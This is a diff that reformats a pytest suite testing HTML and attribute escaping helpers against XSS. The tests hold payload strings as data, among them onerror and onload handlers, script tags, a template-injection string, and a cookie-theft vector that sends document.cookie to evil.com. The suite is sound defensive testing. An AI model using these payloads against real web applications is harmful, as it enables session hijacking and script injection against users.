@@ -10,6 +10,7 @@ OWASP LLM02 — Sensitive Information Disclosure (output encoding)
 MITRE T1059 — Command and Scripting Interpreter
 MITRE T1185 — Browser Session Hijacking
 """
+
 from __future__ import annotations
 
 import re
@@ -25,6 +26,7 @@ _PROJECT_ROOT = Path(__file__).resolve().parent.parent.parent
 # in each app.js exactly).
 # ---------------------------------------------------------------------------
 
+
 def esc_html(s: str) -> str:
     """Mirror of escHtml() / escapeHtml() / esc() used across all apps.
 
@@ -33,12 +35,7 @@ def esc_html(s: str) -> str:
     The approval-review and template apps use a DOM textContent trick which
     encodes the same set.
     """
-    return (
-        s.replace("&", "&amp;")
-        .replace("<", "&lt;")
-        .replace(">", "&gt;")
-        .replace('"', "&quot;")
-    )
+    return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")
 
 
 def esc_attr(s: str) -> str:
@@ -47,17 +44,14 @@ def esc_attr(s: str) -> str:
     Must encode: & ' " < >
     """
     return (
-        s.replace("&", "&amp;")
-        .replace("'", "&#39;")
-        .replace('"', "&quot;")
-        .replace("<", "&lt;")
-        .replace(">", "&gt;")
+        s.replace("&", "&amp;").replace("'", "&#39;").replace('"', "&quot;").replace("<", "&lt;").replace(">", "&gt;")
     )
 
 
 # ---------------------------------------------------------------------------
 # Helpers
 # ---------------------------------------------------------------------------
+
 
 def _is_safe_html_content(escaped: str) -> bool:
     """Return True if the escaped string can't execute scripts when injected
@@ -82,6 +76,7 @@ def _is_safe_attr_value(escaped: str) -> bool:
 # escHtml / escapeHtml / esc — HTML body context
 # ===================================================================
 
+
 class TestEscHtml:
     """Tests for the HTML body escaping function."""
 
@@ -91,13 +86,13 @@ class TestEscHtml:
 
     @pytest.mark.owasp_a03
     def test_img_onerror(self):
-        payload = '<img src=x onerror=alert(1)>'
+        payload = "<img src=x onerror=alert(1)>"
         escaped = esc_html(payload)
         assert _is_safe_html_content(escaped)
 
     @pytest.mark.owasp_a03
     def test_svg_onload(self):
-        payload = '<svg onload=alert(1)>'
+        payload = "<svg onload=alert(1)>"
         escaped = esc_html(payload)
         assert "<svg" not in escaped
 
@@ -186,7 +181,7 @@ class TestEscHtml:
 
     @pytest.mark.mitre_t1185
     def test_cookie_theft_vector(self):
-        payload = '<img src=x onerror="document.location=\'http://evil.com/?c=\'+document.cookie">'
+        payload = "<img src=x onerror=\"document.location='http://evil.com/?c='+document.cookie\">"
         escaped = esc_html(payload)
         assert _is_safe_html_content(escaped)
 
@@ -194,6 +189,7 @@ class TestEscHtml:
 # ===================================================================
 # escAttr — Attribute value context (single or double quotes)
 # ===================================================================
+
 
 class TestEscAttr:
     """Tests for the HTML attribute escaping function."""
@@ -232,7 +228,7 @@ class TestEscAttr:
 
     @pytest.mark.owasp_a03
     def test_angle_bracket_in_attr(self):
-        payload = '<script>alert(1)</script>'
+        payload = "<script>alert(1)</script>"
         escaped = esc_attr(payload)
         assert _is_safe_attr_value(escaped)
 
@@ -291,6 +287,7 @@ class TestEscAttr:
 # Cross-cutting: both functions used together (real-world rendering)
 # ===================================================================
 
+
 class TestCombinedEscaping:
     """Test that escaping is correct in contexts where both functions are used."""
 
@@ -327,17 +324,17 @@ class TestCombinedEscaping:
         malicious_sev = '" onclick="alert(1)" class="x'
         safe = esc_attr(malicious_sev)
         assert '"' not in safe
-        assert f'sev-select sev-{safe}'  # verify interpolation is safe
+        assert f"sev-select sev-{safe}"  # verify interpolation is safe
 
     @pytest.mark.llm02
     def test_llm_generated_state_with_xss(self):
         """LLM might generate state containing XSS payloads."""
         payloads = [
-            '<img src=x onerror=alert(1)>',
+            "<img src=x onerror=alert(1)>",
             '"><script>alert(1)</script>',
             "';alert(String.fromCharCode(88,83,83))//",
-            '<svg/onload=alert(1)>',
-            'javascript:alert(1)',
+            "<svg/onload=alert(1)>",
+            "javascript:alert(1)",
             '{{constructor.constructor("return this")()}}',
         ]
         for payload in payloads:
@@ -349,7 +346,7 @@ class TestCombinedEscaping:
     @pytest.mark.owasp_a03
     def test_double_escaping_is_safe(self):
         """Double-escaping shouldn't create exploitable output."""
-        payload = '<script>alert(1)</script>'
+        payload = "<script>alert(1)</script>"
         once = esc_html(payload)
         twice = esc_html(once)
         assert _is_safe_html_content(twice)
@@ -369,6 +366,7 @@ class TestCombinedEscaping:
 # ===================================================================
 # Source code verification: ensure all apps use escaping correctly
 # ===================================================================
+
 
 class TestSourceCodePatterns:
     """Static analysis of JS source files to verify escaping is applied."""
@@ -405,7 +403,7 @@ class TestSourceCodePatterns:
         """security-qa escAttr must encode & < > in addition to quotes."""
         src = self._read_js("examples/security-qa/app.js")
         # Find escAttr function body
-        match = re.search(r'function\s+escAttr\s*\([^)]*\)\s*\{([^}]+)\}', src)
+        match = re.search(r"function\s+escAttr\s*\([^)]*\)\s*\{([^}]+)\}", src)
         assert match, "escAttr function not found"
         body = match.group(1)
         assert "&amp;" in body, "escAttr must encode &"
